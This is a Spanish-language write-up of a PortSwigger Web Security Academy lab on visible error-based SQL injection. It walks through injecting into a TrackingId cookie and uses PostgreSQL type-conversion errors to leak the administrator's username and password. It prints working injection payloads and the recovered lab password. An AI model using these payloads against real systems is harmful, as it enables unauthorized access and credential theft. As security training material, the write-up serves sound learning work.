# Lab 13 — Visible Error-Based SQL Injection

## Resumen

**Plataforma:** PortSwigger Web Security Academy  
**Categoría:** SQL Injection  
**Tipo:** Visible Error-Based SQL Injection  
**Dificultad:** Practitioner

### Objetivo

Explotar una vulnerabilidad SQL Injection presente en la cookie `TrackingId` para obtener la contraseña del usuario `administrator` y utilizarla para iniciar sesión en la aplicación.

---

## Vulnerabilidad

La aplicación utiliza la cookie `TrackingId` para realizar seguimiento de usuarios y posteriormente incorpora su valor dentro de una consulta SQL.

A diferencia de los laboratorios anteriores:

- No existe una diferencia visual entre respuestas verdaderas y falsas.
- No es necesario inferir datos carácter por carácter.
- Los errores SQL son visibles para el usuario.

Esto permite provocar errores de base de datos que revelan información sensible directamente en la respuesta HTTP.

---

## 1. Identificación del punto de inyección

Se interceptó una petición mediante Burp Suite y se identificó la cookie:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ
```

Para comprobar si era vulnerable a SQL Injection se añadió una comilla simple:

```text
TrackingId=ogAZZfxtOKUELbuJ'
```

La aplicación respondió con un mensaje de error detallado:

```text
Unterminated string literal started at position...
```

Además, el mensaje reveló parte de la consulta SQL ejecutada por el servidor:

```sql
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ'
```

Esto confirmó que el valor de la cookie se estaba insertando dentro de una cadena SQL.

---

## 2. Reparando la consulta

La comilla añadida provocaba un error de sintaxis debido a que la cadena quedaba sin cerrar.

Para corregir la consulta se utilizaron comentarios SQL:

```text
TrackingId=ogAZZfxtOKUELbuJ'--
```

La respuesta dejó de mostrar errores, indicando que la consulta volvía a ser válida.

---

## 3. Verificación de ejecución SQL

A continuación se probó una subconsulta simple:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

La aplicación respondió con un error indicando que la condición del operador `AND` debía ser booleana.

Por lo tanto se adaptó la consulta:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

La petición fue procesada correctamente.

Esto confirmó que era posible ejecutar subconsultas arbitrarias.

---

## 4. Enumeración de usuarios

El siguiente paso consistió en recuperar información desde la tabla `users`.

Se utilizó:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

Sin embargo, la respuesta indicaba que el payload estaba siendo truncado debido a una limitación de longitud en la cookie.

Para solucionar el problema se eliminó completamente el valor original del `TrackingId`.

Payload utilizado:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

La consulta fue ejecutada correctamente, pero devolvió un error indicando que la subconsulta retornaba múltiples filas.

---

## 5. Obtención del usuario administrador

Para limitar el resultado a una única fila se añadió:

```sql
LIMIT 1
```

Payload:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

La respuesta fue:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

Esto confirmó que:

```text
administrator
```

era el primer usuario almacenado en la tabla `users`.

---

## 6. Obtención de la contraseña

Una vez identificado el usuario administrador, se sustituyó la columna `username` por `password`.

Payload:

```text
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

La aplicación respondió con:

```text
ERROR: invalid input syntax for type integer: "wx6najaqykx24nctpmin"
```

La contraseña del usuario administrador era:

```text
wx6najaqykx24nctpmin
```

---

## 7. Autenticación

Con las credenciales obtenidas se inició sesión como:

```text
Usuario: administrator
Contraseña: wx6najaqykx24nctpmin
```

La autenticación fue exitosa y el laboratorio quedó resuelto.

---

## Conceptos aprendidos

### Error-Based SQL Injection

Una Error-Based SQL Injection consiste en provocar errores controlados en la base de datos para obtener información sensible a través de los mensajes de error.

A diferencia de una Blind SQL Injection, no es necesario inferir los datos carácter por carácter.

### Conversión de tipos

La técnica utilizada se basó en provocar un error de conversión:

```sql
CAST(valor AS int)
```

Cuando PostgreSQL intentó convertir una cadena de texto a entero, devolvió un mensaje de error que incluía el valor original.

Ejemplo:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

o

```text
ERROR: invalid input syntax for type integer: "wx6najaqykx24nctpmin"
```

### PostgreSQL

Durante la explotación se identificó que la aplicación utilizaba PostgreSQL gracias a los mensajes de error mostrados por el servidor.

### Limitaciones de longitud

Uno de los aspectos más interesantes de este laboratorio fue detectar que el valor original del `TrackingId` ocupaba parte del espacio disponible.

Esto provocaba que algunos payloads fueran truncados antes de llegar al comentario:

```sql
--
```

La solución consistió en eliminar completamente el valor original de la cookie para disponer de más espacio.

---

## Metodología

```text
Identificar TrackingId vulnerable
            ↓
Provocar error de sintaxis
            ↓
Observar consulta SQL revelada
            ↓
Cerrar correctamente la consulta
            ↓
Confirmar ejecución de subconsultas
            ↓
Consultar usernames
            ↓
Identificar administrator
            ↓
Consultar passwords
            ↓
Filtrar contraseña mediante error visible
            ↓
Autenticar como administrator
```

---

## Herramientas utilizadas

- Burp Suite
- Burp Repeater
- Navegador integrado de Burp
- PortSwigger Web Security Academy

---

## Conclusión

Este laboratorio demostró cómo una aplicación que expone mensajes de error detallados puede convertirse en una fuente directa de información sensible.

A diferencia de los laboratorios anteriores basados en respuestas condicionales o errores booleanos, en este caso fue posible recuperar información directamente desde los mensajes de error generados por PostgreSQL.

Mediante el uso de conversiones de tipo y subconsultas SQL fue posible obtener primero el nombre del usuario administrador y posteriormente su contraseña sin necesidad de realizar ataques de fuerza bruta ni extracción carácter por carácter.

**Estado del laboratorio: Resuelto ✅**
